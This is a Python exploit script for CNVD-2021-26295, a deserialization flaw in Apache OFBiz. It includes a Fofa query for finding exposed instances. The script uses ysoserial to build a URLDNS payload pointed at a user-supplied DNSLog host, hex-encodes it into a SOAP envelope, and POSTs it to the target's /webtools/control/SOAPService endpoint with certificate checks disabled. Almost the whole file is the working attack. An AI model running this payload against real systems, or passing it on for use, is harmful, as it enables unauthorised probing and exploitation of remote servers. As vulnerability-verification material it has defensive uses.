# coding=utf-8
# CNVD-2021-26295
# Apache-OFBiz 反序列化漏洞
# Fofa：app="Apache-OFBiz"


import requests
import os
import sys
import subprocess
import time
requests.packages.urllib3.disable_warnings()

def title():
    print("+-------------------------------------------------+")
    print("+-----------    CNVD-2021-26295   ----------------+")
    print("+----------   Apache OFB 反序列化漏洞   ------------+")
    print("+--------  use: python3 CNVD-2021-26295.py -------+")
    print("+--------        Author: Henry4E36         -------+")
    print("+-------------------------------------------------+")

def check_jar():
    if "ysoserial.jar" in os.listdir('.'):
        print("[0]  \033[32m检查完成，正在执行程序！\033[0m")
    else:
        print('[!]  \033[31m当前目录下不存在"ysoserial.jar"，程序无法运行！\033[0m')
        sys.exit(0)

def trans(s):
    return "%s" % ''.join('%.2x' % x for x in s)

def rce_run(dnslog):
    popen = subprocess.Popen(['java','-jar','ysoserial.jar','URLDNS',dnslog],stdout=subprocess.PIPE)
    data = popen.stdout.read()
    print("[0]  \033[32m程序正在执行转码.....\033[0m")
    hex_data = trans(data)
    # 没别的意思，就是想停下来想静静一秒
    time.sleep(1)
    print("[0]  \033[32m程序转码完成！\033[0m")
    return hex_data

def target_url(url,hex_data,dnslog):
    target_url = url + "/webtools/control/SOAPService"
    # 代理调试贼好用。
    # proxies = {
    #     "http":"127.0.0.1:8080",
    #     "https":"127.0.0.1:8080"
    # }
    data = f"""
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> 
<soapenv:Header/>
<soapenv:Body>
<ser>
  <map-HashMap>
      <map-Entry>
          <map-Key>
    <cus-obj>{hex_data}</cus-obj>
          </map-Key>
          <map-Value>
              <std-String value="{dnslog}"/>
          </map-Value>
      </map-Entry>
  </map-HashMap>
</ser>
</soapenv:Body>
</soapenv:Envelope>
    """
    try:
        # 加上proxies=proxies 代理到burp上调试贼好用
        res = requests.post(url=target_url,data=data,verify=False,timeout=5)
        if res.status_code == 200:
            print(f"[!]  \033[31m目标系统 {url}存在漏洞，请查看你的DNSLog响应！\033[0m")
        else:
            print(f"[!]  [31m目标系统 {url}不存在漏洞！")
    except Exception as e:
        print('[!]  \033[31m程序发生意外错误！\033[0m',e)



if __name__ == "__main__":
    title()
    check_jar()
    url = str(input("[-]  请输入目标系统URL: "))
    dnslog = str(input("[-]  请输入你的DNSLog: "))
    hex_data = rce_run(dnslog)
    target_url(url,hex_data,dnslog)